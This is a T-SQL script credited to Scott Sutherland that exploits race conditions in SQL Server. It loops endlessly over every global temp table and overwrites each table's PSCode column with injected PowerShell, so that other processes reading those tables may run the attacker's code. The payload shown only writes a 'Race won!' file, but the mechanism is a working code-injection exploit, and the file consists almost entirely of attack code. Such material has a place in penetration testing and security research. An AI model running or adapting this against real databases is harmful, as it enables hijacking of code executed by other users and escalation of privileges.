-------------------------------------------------------
-- Script: Get-GlobalTempTable-RaceUpdate
-- Author: Scott Sutherland
-- Description: 
-- Update contents of all global temp tables using
-- user define code, this can be useful for exploiting 
-- some race conditions.
-------------------------------------------------------

-- Loop forever
WHILE 1=1 
BEGIN
	
	-- Slow down if needed
	waitfor delay '0:0:5'

	-- Setup variables
	DECLARE @mytempname varchar(max)
	DECLARE @psmyscript varchar(max)

	-- Iterate through all global temp tables 
	DECLARE MY_CURSOR CURSOR 
		FOR SELECT name FROM tempdb.sys.tables WHERE name LIKE '##%'
	OPEN MY_CURSOR
	FETCH NEXT FROM MY_CURSOR INTO @mytempname 
	WHILE @@FETCH_STATUS = 0
	BEGIN 
	    
		-- Print table name
		PRINT @mytempname 
	
		-- Update table contents with script
		DECLARE @myname varchar(max)
		DECLARE @mycode varchar(max)
		SET @mycode = 'write-output "Race won!" | Out-File c:\windows\temp\FinishLine.txt'
		SET @myname = 'UPDATE [' + @mytempname + ']' 
					  + 'SET PSCode = ''' + @mycode + ''''
		EXEC(@myname)
	
		-- Next record
		FETCH NEXT FROM MY_CURSOR INTO @mytempname  
	END
	CLOSE MY_CURSOR
	DEALLOCATE MY_CURSOR
END
